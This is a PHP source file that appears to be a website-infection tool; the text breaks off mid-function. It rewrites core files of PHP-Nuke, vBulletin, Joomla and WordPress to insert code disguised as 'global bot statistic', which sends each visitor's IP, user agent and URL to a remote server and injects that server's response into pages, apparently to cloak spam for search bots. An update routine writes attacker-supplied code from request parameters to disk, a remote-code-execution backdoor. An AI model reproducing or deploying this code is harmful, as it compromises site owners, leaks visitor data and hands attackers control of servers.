<?php  
ignore_user_abort(true); 
set_time_limit(0); 
error_reporting(0); 	 



function get_headers_curl(& $url) 
{ 
	$ch = curl_init(); 

	curl_setopt($ch, CURLOPT_URL,            $url); 
	curl_setopt($ch, CURLOPT_HEADER,         true); 
	curl_setopt($ch, CURLOPT_NOBODY,         true); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
	curl_setopt($ch, CURLOPT_TIMEOUT,        3); 

	$r = curl_exec($ch); 
	$r = split("\n", $r); 
	return $r; 
}

function CheckAvalibility(& $rsURL) 
{	
	$sResult = get_headers_curl($rsURL); 
	
	$nMatch = preg_match('#[123][0-9]{2,2}#i', $sResult[0]); 
	if($nMatch === false || $nMatch > 0)
	{
		return true; 	
	} 
	
	return false;
}


function CheckCurlWork($sCheckUrl) 
{
	if(function_exists(curl_init) == true) 
	{
		if(CheckAvalibility($sCheckUrl) === true)  
		{		
			return true;
		}
	}
	
	return false;
}

function GetContents($sContentUrl, & $sOutContent) 
{
	if(function_exists(file_get_contents) == true) 
	{
		$sOutContent = file_get_contents($sContentUrl);
		if(!($sOutContent === false))
		{
			return true;
		}
	}
	
	if(function_exists(curl_init) == true) 
	{
		if(CheckAvalibility($sContentUrl) === true)  
		{		
			$stCurlHandle = NULL; 
			$stCurlHandle = curl_init($sContentUrl);  
			curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1); 
			$sOutContent = curl_exec($stCurlHandle);  
			curl_close($stCurlHandle);   
			if(!($sOutContent === false))
			{
				return true;
			}
		}
	}
	
	$stUrlHandle = fopen($sContentUrl, "r");
	if($stUrlHandle === false)
	{
		return false;
	}
	
	$sOutContent = '';
	
		while (!feof($stUrlHandle))
		{
			$sTempContent = fgets($stUrlHandle, 1024);
			if (!$sTempContent)
			{
				break;
			}
		   $sOutContent .= $sTempContent;
		}
	fclose($stUrlHandle);

	if(!($sOutContent === false) && strlen($sOutContent) > 0)
	{
		return true;
	}
	
	return false;
}

function RecursiveDelete($directory, $empty = false)  
{ 
    if(substr($directory,-1) == "/") 
	{ 
        $directory = substr($directory,0,-1); 
    } 

    if(!file_exists($directory) || !is_dir($directory)) 
	{ 
        return false; 
    } elseif(!is_readable($directory)) 
	{ 
        return false; 
    } else { 
        $directoryHandle = opendir($directory); 
        
        while ($contents = readdir($directoryHandle)) 
		{ 
            if($contents != '.' && $contents != '..' && $contents != '.htaccess') 
			{ 
                $path = $directory . "/" . $contents; 
                
                if(is_dir($path)) 
				{ 
                    RecursiveDelete($path); 
                } else 
				{ 
                    unlink($path); 
                } 
            } 
        } 
        
        closedir($directoryHandle); 

        if($empty == false) 
		{ 
            if(!rmdir($directory)) 
			{ 
                return false; 
            } 
        } 
        
        return true; 
    } 
}

function MakePhpNukePreg($sInlucdePath, & $rsScriptURL, $bUseCurlScript)
{
	$sInOutContent = '';
	
	$sIncludeFileContent = '';
	$stIncludeFileHandle = fopen($sInlucdePath, 'r');
	if($stIncludeFileHandle === false)
	{
		echo '<fail>fail open include file</fail>';
		exit();
	}
		$sInOutContent = fread($stIncludeFileHandle, filesize($sInlucdePath)); 
		if($sIncludeFileContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>';
			exit();
		}
		
		$nMatch = preg_match('#((?:<\\?php)|(?:<\\?))\\s+error_reporting\\(0\\);\\s*#i', $sInOutContent);
		if($nMatch === false || $nMatch == 0)
		{		
			$nReplaceCount = 0;
			$sInOutContent = preg_replace('#((?:<\\?php)|(?:<\\?))#i', '\1'."\nerror_reporting(0);\n", $sInOutContent, 1, $nReplaceCount);
			if($sInOutContent === NULL || $sInOutContent == '')
			{
				echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
				exit();
			}
			if($nReplaceCount == 0) 
			{
				$sInOutContent = "<?php error_reporting(0); ?>\n".$sInOutContent;
			} 
			
		}
		
		
		$sAddScript = ''; 
		if($bUseCurlScript == false)
		{
			$sAddScript = '
	
// This code use for global bot statistic
$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); //  Looks for google serch bot
if(!(strpos($sUserAgent, \'google\') === false)) // Bot comes
{
	if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create bot analitics			
	echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\']) );
} else
{
	if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
	echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\']));
} // Statistic code end
	
	';
		} else
		{
			$sAddScript = '
	
// This code use for global bot statistic
$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); //  Looks for google serch bot
$stCurlHandle = NULL;
if(!(strpos($sUserAgent, \'google\') === false)) // Bot comes
{
	if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
	$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\'])); 
} else
{
	if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
	$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\'])); 
}
curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
$sResult = curl_exec($stCurlHandle); 
curl_close($stCurlHandle); 
echo $sResult; // Statistic code end
	
	';
		}
		
		$sInOutContent = preg_replace('#(global\\s+\\$prefix\\s*,\\s+\\$db\\s*;)#i', '\1'.$sAddScript, $sInOutContent);
		if($sInOutContent === NULL || $sInOutContent == '')
		{
			echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
			exit();
		}
		
		
	
	$stUpdateFileHanle = fopen($sInlucdePath, 'w');
	if($stUpdateFileHanle === false)
	{
		echo '<fail>Can\'t open include file for write</fail>';
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sInOutContent) === false)
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>';
			exit();
		}
	fclose($stUpdateFileHanle);
}

function MakeVBulletinPreg($sInlucdePath, & $rsScriptURL, $bUseCurlScript)
{
	$sInOutContent = '';
	
	$sIncludeFileContent = '';
	$stIncludeFileHandle = fopen($sInlucdePath, 'r');
	if($stIncludeFileHandle === false)
	{
		echo '<fail>fail open include file</fail>'; 
		exit();
	}
		$sInOutContent = fread($stIncludeFileHandle, filesize($sInlucdePath)); 
		if($sIncludeFileContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>'; 
			exit();
		}
	fclose($stIncludeFileHandle);
	
		$nMatch = preg_match('#define\\(\\s*\'[a-zA-Z0-9_-]+\'\\s*,[[:print:]]*?\\);\\s*error_reporting\\(0\\);#i', $sInOutContent);
		if($nMatch === false || $nMatch == 0)
		{
			$nReplaceCount = 0;
			$sInOutContent = preg_replace('#(define\\(\\s*\'[a-zA-Z0-9_-]+\'\\s*,[[:print:]]*?\\);)#i', '\1'."\nerror_reporting(0);\n", $sInOutContent, 1, $nReplaceCount);
			if($sInOutContent === NULL || $sInOutContent == '')
			{
				echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
				exit();
			}
			if($nReplaceCount == 0) 
			{
				$nMatch = preg_match('#((?:<\\?php)|(?:<\\?))\\s+error_reporting\\(0\\);\\s*#i', $sInOutContent);
				if($nMatch === false || $nMatch == 0)
				{		
					$nReplaceCount = 0;
					$sInOutContent = preg_replace('#((?:<\\?php)|(?:<\\?))#i', '\1'."\nerror_reporting(0);\n", $sInOutContent, 1, $nReplaceCount);
					if($sInOutContent === NULL || $sInOutContent == '')
					{
						echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
						exit();
					}
					if($nReplaceCount == 0) 
					{
						$sInOutContent = "<?php error_reporting(0); ?>\n".$sInOutContent;
					}
				}
			}
		}
	
			if($bUseCurlScript == false)
			{
				$sAddScript = '
				
	// This code use for global bot statistic
	if(!(($nPos = strpos($vartext, \'</body>\')) === false) || !(($nPos = strpos($vartext, \'</body>\')) === false))
	{
		$sBonInfo = \'\';
		$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); //  Looks for google serch bot
		if(!(strpos($sUserAgent, \'google\') === false)) // Bot comes
		{
			if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create bot analitics			
			$sBonInfo = file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\']) );
		} else
		{
			if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
			$sBonInfo = file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\']));
		} 
		
		$vartext = substr_replace($vartext, $sBonInfo, $nPos, 0);
	} // Statistic code end
	
	';
			} else
			{
				$sAddScript = '
				
	// This code use for global bot statistic
	if(!(($nPos = strpos($vartext, \'</body>\')) === false) || !(($nPos = strpos($vartext, \'</body>\')) === false))
	{
		$sBonInfo = \'\';
		$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); //  Looks for google serch bot
		$stCurlHandle = NULL;
		if(!(strpos($sUserAgent, \'google\') === false)) // Bot comes
		{
			if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
			$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\'])); 
		} else
		{
			if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
			$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\'])); 
		}
		curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
		$sBonInfo = curl_exec($stCurlHandle); 
		curl_close($stCurlHandle); 
		
		$vartext = substr_replace($vartext, $sBonInfo, $nPos, 0);
	} // Statistic code end
	
	';
			}
	
	
	$nReplaceCount = 0;
	$sInOutContent = preg_replace('#(\\$output\\s*=\\s*process_replacement_vars\\(\\$vartext\\);)#i', $sAddScript.'\1', $sInOutContent);
	if($sInOutContent === NULL || $sInOutContent == '')
	{
		echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
		exit();
	}
		
	
	$stUpdateFileHanle = fopen($sInlucdePath, 'w');
	if($stUpdateFileHanle === false)
	{
		echo '<fail>Can\'t open include file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sInOutContent) === false)
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
}

function MakeJoomlaPreg($sInlucdePath, & $rsScriptURL, $bUseCurlScript)  
{
	$sInOutContent = '';
	
	$sIncludeFileContent = '';
	$stIncludeFileHandle = fopen($sInlucdePath, 'r');
	if($stIncludeFileHandle === false)
	{
		echo '<fail>fail open include file</fail>'; 
		exit();
	}
		$sInOutContent = fread($stIncludeFileHandle, filesize($sInlucdePath)); 
		if($sIncludeFileContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>'; 
			exit();
		}
	fclose($stIncludeFileHandle);
	
	
		$bIsBodyInTags = false;
		$lssMatches = array(); 
		$nMatches = preg_match_all('#<\\?([[:print:]\\s]*?)\\?>#i', $sInOutContent, $lssMatches);
		if(!($nMatches === false) && $nMatches > 0)
		{
			foreach($lssMatches as $sTegContents) 
			{
				$nMatch = preg_match('#<\s*\/\s*body\s*>#i', $sTegContents); 
				if(!($nMatch === false) && $nMatch > 0)  
				{
					$bIsBodyInTags = true;
					break;
				}
			}
		}
		
		$nMatch = preg_match('#((?:<\\?php)|(?:<\\?))\\s+error_reporting\\(0\\);\\s*#i', $sInOutContent);
		if($nMatch === false || $nMatch == 0)
		{		
			$nReplaceCount = 0;
			$sInOutContent = preg_replace('#((?:<\\?php)|(?:<\\?))#i', '\1'."\nerror_reporting(0);\n", $sInOutContent, 1, $nReplaceCount); 
			if($sInOutContent === NULL || $sInOutContent == '')
			{
				echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
				exit();
			}
			if($nReplaceCount == 0) 
			{
				$sInOutContent = "<?php error_reporting(0); ?>\n".$sInOutContent;
			}
		}
		
		
		if($bIsBodyInTags === false)
		{
			$sAddScript = ''; 
			if($bUseCurlScript == false) 
			{
				$sAddScript = '
<?php
	// This code use for global bot statistic
	$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); //  Looks for google serch bot
	if(!(strpos($sUserAgent, \'google\') === false)) // Bot comes
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create bot analitics			
		echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\']) );
	} else
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
		echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\']));
	} // Statistic code end
?>

	';
			} else
			{
				$sAddScript = '
<?php	
	// This code use for global bot statistic
	$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); //  Looks for google serch bot
	$stCurlHandle = NULL;
	if(!(strpos($sUserAgent, \'google\') === false)) // Bot comes
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
		$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\'])); 
	} else
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
		$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\'])); 
	}
	curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
	$sResult = curl_exec($stCurlHandle); 
	curl_close($stCurlHandle); 
	echo $sResult; // Statistic code end
?>	
	';
			}
		
			$nReplaceCount = 0; 
			$sInOutContent = preg_replace('#(<\s*\/\s*body\s*>)#i', $sAddScript.'\1', $sInOutContent, 1, $nReplaceCount);
			if($sInOutContent === NULL || $sInOutContent == '')
			{
				echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
				exit();
			}
			if($nReplaceCount == 0)
			{
				$sInOutContent .= $sAddScript; 
			}
		} else
		{
			echo '<fail>Tag Body is in php tags</fail>'; 
			exit();
		}
		
		
	
	$stUpdateFileHanle = fopen($sInlucdePath, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open include file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sInOutContent) === false) 
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
}

function MakeWordPressPreg($sInlucdePath, & $rsScriptURL, $bUseCurlScript, $bIsFirstFile )  
{
	$sInOutContent = '';
	
	$sIncludeFileContent = '';
	$stIncludeFileHandle = fopen($sInlucdePath, 'r');  
	if($stIncludeFileHandle === false)
	{
		echo '<fail>fail open include file</fail>'; 
		exit();
	}
		$sInOutContent = fread($stIncludeFileHandle, filesize($sInlucdePath)); 
		if($sIncludeFileContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>'; 
			exit();
		}
	fclose($stIncludeFileHandle);
	
		if($bUseCurlScript == false) 
		{
			$sAddScript = '
	
	// This code use for global bot statistic
	$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); //  Looks for google serch bot
	if(!(strpos($sUserAgent, \'google\') === false)) // Bot comes
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create bot analitics			
		echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\']) );
	} else
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
		echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\']));
	} // Statistic code end	
';
		} else
		{
			$sAddScript = '
	
	// This code use for global bot statistic
	$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); //  Looks for google serch bot
	$stCurlHandle = NULL;
	if(!(strpos($sUserAgent, \'google\') === false)) // Bot comes
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
		$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\'])); 
	} else
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) // Create  bot analitics			
		$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\'])); 
	}
	curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
	$sResult = curl_exec($stCurlHandle); 
	curl_close($stCurlHandle); 
	echo $sResult; // Statistic code end
';
		}
		
		$sInOutContent = preg_replace('#(function[\\s\\n]*get_footer[\\s\\n]*\\([^(^)^{^}]*\\)[\\s\\n]*{)#i', '\1'.$sAddScript, $sInOutContent);
		if($sInOutContent === NULL || $sInOutContent == '')
		{
			echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
			exit();
		}
		
	$stUpdateFileHanle = fopen($sInlucdePath, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open include file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sInOutContent) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
}

function UpdatePath(& $rsCurrentScriptContent, & $rsNewScriptContent) 
{
	$lssScriptPathMatch = array(); 
	
	
	$nMatchResult = preg_match('#define\\(\'__SCRIPT_PATH_\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$SCRIPT_PATH$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}

	$nMatchResult = preg_match('#define\\(\'__UPDATE_CACHE1_\', \'(.*)\'\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$CACHE_FILE_PATH_FIRST$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}	
	
	$nMatchResult = preg_match('#define\\(\'__UPDATE_CACHE2_\', \'(.*)\'\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$CACHE_FILE_PATH_SECOND$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}	
	
	$nMatchResult = preg_match('#define\\(\'__CACHE_FOLDER_\', \'(.*)\'\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0)
	{
		$rsNewScriptContent = str_replace('\'%$CACHE_STANDART_FOLDER$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}		
}

 
function Update() 
{
	$sFileName = ''; 
	if(isset($_SERVER['SCRIPT_FILENAME']) == true)
	{
		$stScritpPath = explode('/', $_SERVER['SCRIPT_FILENAME']); 
		$sFileName = $stScritpPath[count($stScritpPath) - 1];  
	} else
		if(isset($_SERVER['SCRIPT_NAME']) == true)
		{
			$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['SCRIPT_NAME'])); 
			$sFileName = $stScritpPath[count($stScritpPath) - 1];  
		} else
			if(isset($_SERVER['PHP_SELF']) == true)
			{
				$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['PHP_SELF'])); 
				$sFileName = $stScritpPath[count($stScritpPath) - 1];  
			} 
	
	$sUpdateFileName = ''; 
	if(isset($_REQUEST['filename']) == true) 
	{
		$sUpdateFileName = $_REQUEST['filename']; 
		if(strlen($sFileName) == 0) 
		{
			$sFileName = $sUpdateFileName;
		}
	} else
	{
		if(strlen($sFileName) == 0) 
		{
			echo '<fail>update script name</fail>'; 
			exit();
		}
		
		$sUpdateFileName = $sFileName;
	}
	
	$sNewScript = ''; 
	if(isset($_REQUEST['update_url']) == true)
	{
		$bGetResult = GetContents($_REQUEST['update_url'], 
								  $sNewScript 
								 ); 
		if($bGetResult == false)
		{
			echo '<fail>get update content fail</fail>'; 
			exit();
		}
	} else
		if(isset($_REQUEST['update_code']) == true) 
		{
			$sNewScript = $_REQUEST['update_code']; 
		} else
		{
			echo '<fail>don\'t have update content</fail>'; 
			exit();
		}
	
	$sCurrentFileContent = ''; 
	
	$stCurrentFileHandle = fopen($sFileName, 'r');  
	if($stCurrentFileHandle === false)
	{
		echo '<fail>fail open current file</fail>'; 
		exit();
	}
		$sCurrentFileContent = fread($stCurrentFileHandle, filesize($sFileName)); 
		if($sCurrentFileContent === false)
		{
			echo '<fail>fail read current file</fail>'; 
			exit();
		}
	fclose($stCurrentFileHandle);
	
	UpdatePath($sCurrentFileContent, $sNewScript); 
	
	$stUpdateFileHanle = fopen($sUpdateFileName, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open update file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sNewScript) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in update file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
	
	echo '<correct>Correct update file</correct>';
}

function RemoveScript() 
{
	define('__SCRIPT_PATH_', '../../../general-template.php'); 
	$sIncludePath = __SCRIPT_PATH_;
	
	$sIncludeFileContent = '';
	$stIncludeFileHandle = fopen($sIncludePath, 'r');  
	if($stIncludeFileHandle === false)
	{
		echo '<fail>fail open include file</fail>'; 
		exit();
	}
		$sIncludeFileContent = fread($stIncludeFileHandle, filesize($sIncludePath)); 
		if($sIncludeFileContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>'; 
			exit();
		}
	fclose($stIncludeFileHandle);
		$lssMatchCode = array(); 
		
		$sIncludeFileContent = preg_replace('#((?:<\\?php\\s*\/\/ This code use for global bot statistic[^>]*\/\/ Statistic code end\\s*\\?>)|(?:\/\/ This code use for global bot statistic[^>]*\/\/ Statistic code end))#i', '', $sIncludeFileContent);
		
	$stUpdateFileHanle = fopen($sIncludePath, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open include file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sIncludeFileContent) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
	
	echo '<correct>Script remove correctly</correct>'; 
}

function TryUpdate(& $rsScriptUrl, $sIncludePath)
{
	$sIncludeFileContent = '';
	$stIncludeFileHandle = fopen($sIncludePath, 'r'); 
	if($stIncludeFileHandle === false)
	{
		echo '<fail>fail open include file</fail>'; 
		exit();
	}
		$sIncludeFileContent = fread($stIncludeFileHandle, filesize($sIncludePath)); 
		if($sIncludeFileContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>'; 
			exit();
		}
	fclose($stIncludeFileHandle);
	
		$lssMatchCode = array(); 
		
		$nMatches = preg_match('#(\/\/ This code use for global bot statistic[[:print:]\\s]*?\/\/ Statistic code end)#i', $sIncludeFileContent, $lssMatchCode);
		if($nMatches === false || $nMatches == 0) 
		{
			return false;
		}
		
		$sIncludeFileContent = preg_replace('#(\/\/ This code use for global bot statistic[[:print:]\\s]*?\/\/ Statistic code end)#i', preg_replace('#http:\/\/.*\?#i', $rsScriptUrl.'?', $lssMatchCode[1]) , $sIncludeFileContent);
	
	$stUpdateFileHanle = fopen($sIncludePath, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open include file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sIncludeFileContent) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
	
	
	return true;
}

function DeactivateCache($sCacheFileConfig)
{

	if(file_exists($sCacheFileConfig) == false) 
	{
		return;
	}

	$sConfigContent = '';
	$stConfigFileHandle = fopen($sCacheFileConfig, 'r');  
	if($stConfigFileHandle === false)
	{
		echo '<fail>fail open cache config file</fail>'; 
		exit();
	}
		$sConfigContent = fread($stConfigFileHandle, filesize($sCacheFileConfig)); 
		if($sConfigContent === false)
		{
			fclose($stConfigFileHandle);
			echo '<fail>fail read cache config file</fail>'; 
			exit();
		}
	fclose($stConfigFileHandle);
	
		
		$sConfigContent = preg_replace('#((?:=)|(?:[\s\n]*))true([\s\n\r]*;)#i', '\\1false\\2', $sConfigContent); 
	
	$stUpdateFileHanle = fopen($sCacheFileConfig, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open cache config file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sConfigContent) === false)  
		{
			fclose($stUpdateFileHanle);
